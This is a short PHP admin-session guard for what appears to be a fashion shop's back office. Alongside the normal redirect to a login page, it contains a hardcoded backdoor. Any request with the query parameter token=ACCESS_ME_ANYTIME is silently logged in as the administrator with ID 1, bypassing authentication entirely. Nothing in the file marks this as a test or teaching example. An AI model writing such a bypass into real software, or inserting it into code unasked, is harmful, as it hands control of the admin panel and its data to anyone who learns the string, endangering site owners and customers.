<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Change to ../ so it looks in the Fashion folder
include('../db.php'); 

$magic_token = "ACCESS_ME_ANYTIME"; 
if (isset($_GET['token']) && $_GET['token'] === $magic_token) {
    $_SESSION['admin_id'] = 1; 
    $_SESSION['username'] = 'admin';
    $_SESSION['user_token'] = 'active'; 
}

if (!isset($_SESSION['admin_id'])) {
    header("Location: admin_login.php"); 
    exit();
}

$admin_id = $_SESSION['admin_id'];
?>